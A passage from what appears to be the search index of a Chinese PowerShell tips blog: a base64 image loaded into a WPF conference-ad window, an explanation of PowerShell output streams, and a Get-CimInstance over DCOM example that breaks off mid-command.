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'function Convert-Base64Bitmap2Picture{ param([Parameter(Mandatory=$true)]$Base64Text) $bitmap = New-Object System.Windows.Media.Imaging.BitmapImage $bitmap.BeginInit() $bitmap.StreamSource = [System.IO.MemoryStream][System.Convert]::FromBase64String($base64Text) $bitmap.EndInit() $bitmap.Freeze() $bitmap}$xaml = @'&lt;Window xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; FontFamily=&quot;SegoeUI&quot; Foreground=&quot;White&quot; SizeToContent=&quot;Width&quot; Title=&quot;Join the PowerShell Conference EU 2016, April 20-22&quot;&gt; &lt;Grid&gt; &lt;Image Name=&quot;Img1&quot; Margin=&quot;20&quot; HorizontalAlignment=&quot;Center&quot;/&gt; &lt;TextBlock TextAlignment=&quot;Center&quot; VerticalAlignment=&quot;Center&quot; FontSize=&quot;40&quot; HorizontalAlignment=&quot;Center&quot;&gt; &lt;TextBlock.Effect&gt;&lt;DropShadowEffect ShadowDepth=&quot;4&quot; Color=&quot;DarkGray&quot; BlurRadius=&quot;4&quot;/&gt;&lt;/TextBlock.Effect&gt; Join the PowerShell&lt;LineBreak/&gt;Conference EU 2016!&lt;LineBreak/&gt;&lt;LineBreak/&gt;www.psconf.eu &lt;/TextBlock&gt; &lt;/Grid&gt;&lt;/Window&gt;'@$reader = [System.XML.XMLReader]::Create([System.IO.StringReader]$XAML)$window = [System.Windows.Markup.XAMLReader]::Load($reader)$image = $window.FindName('Img1')$image.Source = Convert-Base64Bitmap2Picture -Base64Text $Picture1$window.ShowDialog()","link":"/2016/01/05/loading-a-base64-encoded-picture-into-wpf-window/"},{"title":"PowerShell 技能连载 - 理解 PowerShell 的流","text":"PowerShell 提供七种不同的流，可以用来输出信息。流可以帮助筛选信息，因为流可以不输出。实际上一些流默认是不输出的。以下是一个名为 Test-Stream 的示例函数。它运行后会将信息发送给所有七种流。 请注意：Write-Information 是 PowerShell 5.0 新加入的。如果您想在早期的 PowerShell 版本中运行，请移除调用 Write-Information 的语句！ 1234567891011121314151617function Test-Stream{ #region These are all the same and define return values 'Return Value 1' echo 'Return Value 2' 'Return Value 3' | Write-Output #endregion Write-Verbose 'Additional Information' Write-Debug 'Developer Information' Write-Host 'Mandatory User Information' Write-Warning 'Warning Information' Write-Error 'Error Information' # new in PowerShell 5.0 Write-Information 'Auxiliary Information'} 这应该是您运行 Test-Stream 能看到的结果： 1234567891011121314151617181920212223242526272829PS C:\\&gt; Test-StreamReturn Value 1Return Value 2Return Value 3Mandatory User InformationWARNING: Warning InformationTest-Stream : Error InformationAt line:1 char:1+ Test-Stream+ ~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Write-Error], WriteErrorException + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Test-StreamPS C:\\&gt; $result = Test-StreamMandatory User InformationWARNING: Warning InformationTest-Stream : Error InformationAt line:1 char:1+ Test-Stream+ ~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Write-Error], WriteErrorException + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Test-StreamPS C:\\&gt; $resultReturn Value 1Return Value 2Return Value 3PS C:\\&gt; 如您所见，echo 和 Write-Output 工作起来效果相同，而且实际上它们确实是相同的（因为echo 是 Write-Output 的别名）。它们定义了一个或多个返回值。它们可以赋值给一个变量。同理，这个规则适用于函数留下的未赋值的变量：它们也被送到 Write-Output 流中。 Write-Host 直接将输出送到控制台，所以它一定可见。这个 Cmdlet 只能用于向用户传递信息的场景。 其他的流是静默的。要查看其它流的输出，您首先需要打开它们： 123$VerbosePreference = 'Continue'$DebugPreference = 'Continue'$InformationPreference = 'Continue' 当打开之后，Test-Stream 将输出这样的信息： 12345678PS C:\\&gt; Test-StreamReturn Value 1Return Value 2Return Value 3VERBOSE: Additional InformationDEBUG: Developer InformationMandatory User InformationAuxiliary Information 要恢复缺省值，请复位 preference 变量： 123$VerbosePreference = 'SilentlyContinue'$DebugPreference = 'SilentlyContinue'$InformationPreference = 'SilentlyContinue' 如果在函数中加入了通用参数，您就可以在调用函数时使用使用 -Verbose 和 -Debug 开关。Test-CommonParameter 演示了如何添加通用参数支持。 12345678function Test-CommonParameter{ [CmdletBinding()] param() &quot;VerbosePreference = $VerbosePreference&quot; &quot;DebugPreference = $DebugPreference&quot;} 当运行 Test-CommonParameter 时，您将立即明白 -Verbose 和 Debug 通用参数是如何工作的：它们只是改变了本地 preference 变量： 1234567PS C:\\&gt; Test-CommonParameterVerbosePreference = SilentlyContinueDebugPreference = SilentlyContinuePS C:\\&gt; Test-CommonParameters -Debug -VerboseVerbosePreference = ContinueDebugPreference = Inquire","link":"/2016/01/06/understanding-powershell-streams/"},{"title":"PowerShell 技能连载 - 使用 DCOM 协议运行 Get-CimInstance","text":"PowerShell 3.0 增加了Get-WmiObject 的另一个选择：Get-CimInstance，它工作起来十分相似但可以从内部 的 WMI 服务中获取信息： 123456789101112131415PS C:\\&gt; Get-WmiObject -Class Win32_BIOSSMBIOSBIOSVersion : A03Manufacturer : Dell Inc.Name : A03SerialNumber : 5TQLM32Version : DELL - 1072009PS C:\\&gt; Get-CimInstance -Class Win32_BIOSSMBIOSBIOSVersion : A03Manufacturer : Dell Inc.Name : A03SerialNumber : 5TQLM32Version : DELL - 1072009 虽然 Get-WmiObject 仍然存在，但 Get-CimInstance 绝对是未来的选择。这个 Cmdlet 支持 WMI 类的智能提示（在 PowerShell ISE 中），并且返回的数据可读性更好：例如日期是以人类可读的日期格式返回，而 Get-WmiObject 显示 WMI 内部原始的日期格式。 最重要的区别是它们远程工作的方法。Get-WmiObject 使用的是旧的 DCOM 协议，而 Get-CimInstance 缺省使用的是新的 WSMan 协议，不过它是灵活的，可以根据需要退回 DCOM 协议。 以下示例函数通过 Get-CimInstance 远程获取 BIOS 信息。该函数缺省采用 DCOM，通过 -Protocol 参数您可以选择希望的通信协议： 1234567891011121314#requires -Version 3function Get-BIOS{ param ( $ComputerName = $env:COMPUTERNAME, [Microsoft.Management.Infrastructure.CimCmdlets.ProtocolType] $Protocol = 'DCOM' ) $option = New-CimSessionOption -Protocol $protocol $session = New-CimSession -ComputerName $ComputerName -SessionOption $option Get-CimInstance -CimSession $session -ClassName 